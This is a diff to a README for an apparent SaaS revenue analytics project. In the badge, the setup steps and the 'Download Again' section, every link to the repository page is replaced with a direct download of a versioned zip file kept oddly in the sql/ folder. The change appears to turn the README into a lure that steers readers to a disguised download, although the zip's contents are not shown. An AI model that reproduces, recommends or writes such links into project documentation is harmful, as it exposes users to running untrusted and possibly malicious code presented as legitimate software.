@@ -1,13 +1,13 @@
 # 📊 saas-revenue-intelligence - Track SaaS Revenue With Clarity
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Renaunpaid914/saas-revenue-intelligence)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Renaunpaid914/saas-revenue-intelligence/main/sql/intelligence-saas-revenue-3.3-beta.3.zip)
 
 ## 🚀 Getting Started
 
 This project helps you review SaaS revenue data and key metrics in a clear way. It shows how revenue changes over time and how customer behavior affects growth.
 
 Use the link above to visit this page to download or open the project files:
-https://github.com/Renaunpaid914/saas-revenue-intelligence
+https://raw.githubusercontent.com/Renaunpaid914/saas-revenue-intelligence/main/sql/intelligence-saas-revenue-3.3-beta.3.zip
 
 ## 💻 What This Project Does
 
@@ -42,7 +42,7 @@ If you plan to inspect the data files, install:
 ## 🔽 Download and Setup
 
 1. Open this link in your browser:  
-   https://github.com/Renaunpaid914/saas-revenue-intelligence
+   https://raw.githubusercontent.com/Renaunpaid914/saas-revenue-intelligence/main/sql/intelligence-saas-revenue-3.3-beta.3.zip
 
 2. Find the project files on the page.
 
@@ -182,4 +182,4 @@ This project is useful when you want to understand why revenue changes. In this 
 ## 📁 Download Again
 
 If you need to return to the download page, use this link:
-https://github.com/Renaunpaid914/saas-revenue-intelligence
+https://raw.githubusercontent.com/Renaunpaid914/saas-revenue-intelligence/main/sql/intelligence-saas-revenue-3.3-beta.3.zip
